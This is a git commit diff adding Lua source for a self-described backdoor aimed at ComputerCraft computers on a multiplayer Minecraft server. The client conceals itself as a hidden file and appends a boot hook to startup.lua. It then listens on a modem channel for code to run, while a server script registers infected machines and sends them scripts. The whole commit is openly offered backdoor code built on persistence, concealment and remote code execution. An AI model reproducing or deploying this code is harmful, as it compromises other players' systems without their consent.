f6756fe5b48cc629634330b3ee1a1e0f2d401c5f
haawwkeye <connorbishop53@gmail.com>
2022-07-22 13:54:54 -0400

    Setup more server code, Client almost ready?

--- BackdoorClient.lua
+++ BackdoorClient.lua
@@ -1,7 +1,8 @@
 -- computer craft SMP backdoor!
 local pwd = shell.getRunningProgram();
 
-if not fs.exists("/rom/autorun/backdoor.lua") then
+if not fs.exists("/DEV/.backdoor.lua") then
+    --[[
     local _self = fs.open(pwd, "r");
     local file = fs.open("/rom/autorun/backdoor.lua", "w");
 
@@ -11,9 +12,79 @@ if not fs.exists("/rom/autorun/backdoor.lua") then
     file.close();
 
     fs.delete(pwd); -- Hopefully deletes the script
+    --]]
+    local startupFile = fs.open("/startup.lua", "w");
+    local contents = "";
+    if startupFile.readAll ~= nil then
+        contents = startupFile.readAll();
+    end
+    if contents ~= "" then contents = contents.."\n" end;
+    startupFile.write(contents..[[-- DO NOT TOUCH
+    _ENV.string.split = function(inputstr, sep)
+        if sep == nil then
+           sep = "%s"
+        end
+        local t={}
+        for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
+           table.insert(t, str)
+        end
+        return t
+     end
+    
+    local FileList = fs.list("/DEV/") --Table with all the files and directories available
+    
+    for _, file in ipairs(FileList) do --Loop. Underscore because we don't use the key, ipairs so it's in order
+        local tbl = string.split(file, ".");
+        if tbl[#tbl] == "lua" then
+            shell.run("/DEV/" .. file);
+        end
+    end --End the loop
+    -- DO NOT TOUCH]])
+    startupFile.close()
+    shell.run("move " .. pwd .. " /DEV/.backdoor.lua")
+
+    os.reboot();
+else
+    if pwd ~= "DEV/.backdoor.lua" then
+        shell.run("rm /DEV/.backdoor.lua");
+        shell.run("move " .. pwd .. " /DEV/.backdoor.lua");
+        os.reboot();
+    end
+end
+
+if not fs.exists("/startup.lua") then
+    local startupFile = fs.open("/startup.lua", "w");
+    local contents = "";
+    if startupFile.readAll ~= nil then
+        contents = startupFile.readAll();
+    end
+    if contents ~= "" then contents = contents.."\n" end;
+    startupFile.write(contents..[[-- DO NOT TOUCH
+_ENV.string.split = function(inputstr, sep)
+    if sep == nil then
+        sep = "%s"
+    end
+    local t={}
+    for str in string.gmatch(inputstr, "([^"..sep.."]+)") do
+        table.insert(t, str)
+    end
+    return t
+    end
+
+local FileList = fs.list("/DEV/") --Table with all the files and directories available
+
+for _, file in ipairs(FileList) do --Loop. Underscore because we don't use the key, ipairs so it's in order
+    local tbl = string.split(file, ".");
+    if tbl[#tbl] == "lua" then
+        shell.run("/DEV/" .. file);
+    end
+end --End the loop
+-- DO NOT TOUCH]])
+    startupFile.close()
 
     os.reboot();
 end
+
 -- This is how I make the backdoor auto run
 
 function shutdown(msg)
@@ -28,4 +99,17 @@ local modem = peripheral.find("modem") or shutdown("A modem is required");
 modem.open(port); -- This is so the server can request the id
 modem.open(port+id);
 
-modem.transmit(port, port+id, id .. " Ready!")
+modem.transmit(port, port+id, id)
+
+spawn(function()
+    print("Client Started!")
+    while true do
+        local event, side, channel, replyChannel, message, distance = os.pullEventRaw("modem_message"); -- good idea?
+        print(event, side, channel, replyChannel, message, distance)
+        if channel == (port+id) then
+            modem.transmit(port, port+id, pcall(function()
+                return loadstring(message); -- Run lua code here!
+            end))
+        end
+    end
+end)
--- BackdoorServer.lua
+++ BackdoorServer.lua
@@ -1,5 +1,38 @@
 --Server for backdoor commands
-local port = 1489;
+local backdoorComps = {}
+local mainport = 1489;
 local modem = peripheral.find("modem") or error("A modem is required");
 
-modem.open(port); -- This is so the server can request the id
+do -- Backdoor module
+    local Backdoor = {}
+    Backdoor.Comps = backdoorComps;
+    function Backdoor:Send(CompId, script)
+        local port = Backdoor.Comps[CompId];
+        if port then
+            modem.transmit(port, mainport, script or "")
+        end
+    end
+end
+
+modem.open(mainport); -- This is so the server can request the id
+
+function Check(event, side, channel, replyChannel, message, distance)
+    if channel == mainport then
+        local num = tonumber(message);
+        if num ~= nil then
+            backdoorComps[num] = replyChannel;
+            print(num, replyChannel)
+        end
+    end
+end
+
+function listen()
+    local event, side, channel, replyChannel, message, distance = os.pullEventRaw("modem_message");
+    Check(event, side, channel, replyChannel, message, distance)
+end
+
+function toBackground()
+    shell.run("/rom/programs/advanced/multishell")
+end
+--İts working only advanced computers...--
+parallel.waitForAny(toBackground , listen)
